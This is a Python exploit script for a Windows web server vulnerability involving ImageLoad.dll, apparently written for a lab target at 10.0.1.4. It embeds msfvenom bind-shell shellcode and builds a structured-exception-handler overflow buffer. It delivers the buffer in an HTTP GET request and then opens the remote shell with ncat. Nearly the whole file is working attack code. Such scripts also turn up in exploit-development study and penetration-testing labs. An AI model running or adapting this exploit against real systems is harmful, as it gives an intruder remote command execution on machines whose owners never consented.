#!/usr/bin/python
# Using ImageLoad.dll
# Praise be to the shell!
# Pretty much entirely based on ch3rn0byl's exploit
# Tested on Windows 7 and Windows 10
# The hardest part was finding the opcode !
import socket
from sys import argv
from subprocess import call
from time import sleep
# msfvenom -p windows/shell_bind_tcp LHOST=10.0.1.4 LPORT=54321 -n 20 -f python -a x86 --platform windows -b '\x00\x20\x25\x2b\x2f\x5c'
buf =  ""
buf += "\x9f\x3f\x9f\xfc\x48\x48\x40\xd6\x99\x98\x4a\x4b\x91"
buf += "\x91\x90\x42\x91\x37\x4b\x92\xda\xd4\xd9\x74\x24\xf4"
buf += "\x5a\x31\xc9\xb1\x53\xbd\xe3\xbf\x92\xb1\x31\x6a\x17"
buf += "\x03\x6a\x17\x83\x21\xbb\x70\x44\x59\x2c\xf6\xa7\xa1"
buf += "\xad\x97\x2e\x44\x9c\x97\x55\x0d\x8f\x27\x1d\x43\x3c"
buf += "\xc3\x73\x77\xb7\xa1\x5b\x78\x70\x0f\xba\xb7\x81\x3c"
buf += "\xfe\xd6\x01\x3f\xd3\x38\x3b\xf0\x26\x39\x7c\xed\xcb"
buf += "\x6b\xd5\x79\x79\x9b\x52\x37\x42\x10\x28\xd9\xc2\xc5"
buf += "\xf9\xd8\xe3\x58\x71\x83\x23\x5b\x56\xbf\x6d\x43\xbb"
buf += "\xfa\x24\xf8\x0f\x70\xb7\x28\x5e\x79\x14\x15\x6e\x88"
buf += "\x64\x52\x49\x73\x13\xaa\xa9\x0e\x24\x69\xd3\xd4\xa1"
buf += "\x69\x73\x9e\x12\x55\x85\x73\xc4\x1e\x89\x38\x82\x78"
buf += "\x8e\xbf\x47\xf3\xaa\x34\x66\xd3\x3a\x0e\x4d\xf7\x67"
buf += "\xd4\xec\xae\xcd\xbb\x11\xb0\xad\x64\xb4\xbb\x40\x70"
buf += "\xc5\xe6\x0c\xb5\xe4\x18\xcd\xd1\x7f\x6b\xff\x7e\xd4"
buf += "\xe3\xb3\xf7\xf2\xf4\xb4\x2d\x42\x6a\x4b\xce\xb3\xa3"
buf += "\x88\x9a\xe3\xdb\x39\xa3\x6f\x1b\xc5\x76\x05\x13\x60"
buf += "\x29\x38\xde\xd2\x99\xfc\x70\xbb\xf3\xf2\xaf\xdb\xfb"
buf += "\xd8\xd8\x74\x06\xe3\x32\xb5\x8f\x05\xd0\xa6\xd9\x9e"
buf += "\x4c\x05\x3e\x17\xeb\x76\x14\x0f\x9b\x3f\x7e\x88\xa4"
buf += "\xbf\x54\xbe\x32\x34\xbb\x7a\x23\x4b\x96\x2a\x34\xdc"
buf += "\x6c\xbb\x77\x7c\x70\x96\xef\x1d\xe3\x7d\xef\x68\x18"
buf += "\x2a\xb8\x3d\xee\x23\x2c\xd0\x49\x9a\x52\x29\x0f\xe5"
buf += "\xd6\xf6\xec\xe8\xd7\x7b\x48\xcf\xc7\x45\x51\x4b\xb3"
buf += "\x19\x04\x05\x6d\xdc\xfe\xe7\xc7\xb6\xad\xa1\x8f\x4f"
buf += "\x9e\x71\xc9\x4f\xcb\x07\x35\xe1\xa2\x51\x4a\xce\x22"
buf += "\x56\x33\x32\xd3\x99\xee\xf6\xe3\xd3\xb2\x5f\x6c\xba"
buf += "\x27\xe2\xf1\x3d\x92\x21\x0c\xbe\x16\xda\xeb\xde\x53"
buf += "\xdf\xb0\x58\x88\xad\xa9\x0c\xae\x02\xc9\x04"
crash = "A" * 4061
crash += "\xeb\x06\x90\x90"
crash += "\xff\x28\x02\x10"
crash += "D" * (5500 - 4061 - 4 - len(buf))
crash += buf
payload = "GET {} HTTP/1.0\r\n\r\n".format(crash)
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.1.4', 80))
	s.send(payload)
	s.close()
	print "[x] Payload delivered"
	print "[*] Connecting to target...\n"
	try:
		sleep(1)
		call(["ncat", "10.0.1.4", "54321"])
	except:
		print "[!] Couldn't connect to target"
except:
	print "[!] Connection failed"
